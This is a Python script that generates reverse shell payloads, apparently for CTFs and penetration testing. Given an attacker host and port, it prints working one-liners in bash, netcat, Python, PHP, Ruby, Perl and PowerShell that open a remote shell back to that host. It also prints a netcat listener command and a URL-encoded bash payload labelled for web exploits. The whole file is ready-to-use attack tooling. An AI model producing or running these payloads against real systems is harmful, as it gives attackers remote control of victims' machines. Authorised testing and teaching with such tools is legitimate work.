#!/usr/bin/env python3
"""
Reverse Shell Generator
Generates common reverse shell payloads for CTFs and penetration testing.
"""

import sys
import urllib.parse

def generate_shells(lhost, lport):
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_base64": f"echo {urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1\"'.encode().hex())} | xxd -r -p | bash",
        "nc": f"nc -e /bin/bash {lhost} {lport}",
        "nc_alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'",
        "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    }
    
    return shells

def print_listener_command(lport):
    print("\n" + "="*60)
    print("LISTENER COMMAND (run this first):")
    print("="*60)
    print(f"nc -lvnp {lport}")
    print(f"# Or with rlwrap for better shell: rlwrap nc -lvnp {lport}")
    print("="*60 + "\n")

def main():
    if len(sys.argv) != 3:
        print("Usage: reverse_shell.py <LHOST> <LPORT>")
        print("Example: reverse_shell.py 10.10.14.5 4444")
        sys.exit(1)
    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    
    print_listener_command(lport)
    
    shells = generate_shells(lhost, lport)
    
    print("="*60)
    print("REVERSE SHELL PAYLOADS:")
    print("="*60 + "\n")
    
    for name, payload in shells.items():
        print(f"[{name.upper()}]")
        print(payload)
        print()
    
    # URL encoded version
    print("\n" + "="*60)
    print("URL ENCODED (for web exploits):")
    print("="*60)
    bash_shell = shells["bash"]
    print(urllib.parse.quote(bash_shell))
    print()

if __name__ == "__main__":
    main()
